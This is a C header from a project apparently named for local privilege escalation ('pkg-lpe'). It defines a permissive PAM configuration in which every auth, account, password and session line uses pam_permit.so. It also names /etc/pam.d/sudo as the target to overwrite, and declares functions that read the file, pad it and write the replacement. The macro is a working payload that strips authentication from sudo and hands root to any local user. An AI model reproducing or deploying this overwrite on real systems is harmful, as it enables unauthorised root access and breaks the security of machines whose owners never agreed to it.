//
//  pam_parser.h
//  pkg-lpe
//
//  Created by Michael on 23/05/2023.
//

#ifndef pam_parser_h
#define pam_parser_h

#include <stdio.h>
#include <stdbool.h>

// XXX: I originally was parsing and patching the PAM file but
// XXX: this is much quicker lol.
#define PERMISSIVE_PAM "# sudo: auth account password session" \
"\n" \
"auth       optional       pam_permit.so" \
"\n" \
"auth       optional       pam_permit.so" \
"\n" \
"account    optional       pam_permit.so" \
"\n" \
"password   optional       pam_permit.so" \
"\n" \
"session    optional       pam_permit.so"

#define OVERWRITE_FILE  "/etc/pam.d/sudo"
#define TEMP_FILE       "overwrite"

int ReadPamFile(char** contents);

// Calculate padding length we need to add
int PaddingLength(size_t* paddingRequired);

// Write the PAM file with a given number of padding chars
int WriteFile(char* dest, char* contents, size_t paddingRequired);

#endif /* pam_parser_h */
